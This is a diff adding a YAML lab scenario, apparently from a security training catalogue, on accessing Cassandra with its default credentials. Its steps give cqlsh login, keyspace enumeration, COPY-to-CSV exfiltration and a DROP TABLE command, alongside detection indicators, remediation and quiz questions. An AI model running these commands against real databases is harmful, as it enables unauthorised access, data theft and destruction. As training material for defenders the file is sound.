@@ -1,0 +1,91 @@
+# Category: Database Security
+name: "Cassandra Default Credentials – Remote Access and Data Theft"
+id: "database-cassandra-default-001"
+category: "database_security"
+subcategory: "cassandra"
+difficulty: "beginner"
+estimated_time: "30 minutes"
+
+description: |
+  Attempt to access a Cassandra database using default credentials
+  (cassandra/cassandra). If successful, the attacker can query keyspaces
+  and potentially insert or delete data.
+
+learning_objectives:
+  - Understand Cassandra architecture and authentication
+  - Use cqlsh to connect with default credentials
+  - List keyspaces and tables
+  - Extract data or perform destructive actions
+
+tools:
+  - cqlsh (Cassandra query shell)
+  - Python (cassandra-driver)
+
+prerequisites:
+  - Cassandra instance reachable on port 9042
+  - Authentication enabled but credentials unchanged
+
+steps:
+  - id: "step1"
+    phase: "connect"
+    action: "Connect with default creds"
+    commands:
+      - "# Use cqlsh"
+      - "cqlsh <TARGET_IP> -u cassandra -p cassandra"
+    expected_output: "CQL shell prompt"
+    detection: "Cassandra logs show login from unusual IP"
+
+  - id: "step2"
+    phase: "enumeration"
+    action: "List keyspaces and tables"
+    commands:
+      - "DESCRIBE keyspaces;"
+      - "SELECT * FROM system_schema.keyspaces;"
+      - "# Then select from application tables"
+    expected_output: "List of keyspaces and data"
+    detection: "Cassandra audit logs if enabled"
+
+  - id: "step3"
+    phase: "exploitation"
+    action: "Exfiltrate data or drop tables"
+    commands:
+      - "COPY <keyspace>.<table> TO 'data.csv';"
+      - "# Or destructive: DROP TABLE <table>;"
+    expected_output: "Data exfiltrated or table dropped"
+    detection: "Backups corrupted; data loss logs"
+
+compliance_controls:
+  - standard: "MITRE ATT&CK"
+    control: "T1190"
+    description: "Exploit Public-Facing Application"
+  - standard: "CIS Cassandra Benchmarks"
+    control: "1.1"
+    description: "Change default credentials"
+
+detection:
+  network_indicators:
+    - "Traffic to port 9042"
+  log_indicators:
+    - "Cassandra authentication logs with default user"
+  endpoint_indicators:
+    - "cqlsh execution"
+
+remediation:
+  immediate:
+    - "Change default credentials immediately"
+    - "Use network ACLs to restrict access"
+  long_term:
+    - "Enable SSL/TLS for connections"
+    - "Implement role‑based access control"
+
+variables:
+  target_ip: "10.0.0.30"
+
+assessment_questions:
+  - "What is the default username/password for Cassandra?"
+  - "How can you restrict access to Cassandra?"
+  - "What is the role of the system_auth keyspace?"
+
+references:
+  - url: "https://cassandra.apache.org/doc/latest/cassandra/security/"
+    title: "Cassandra Security"
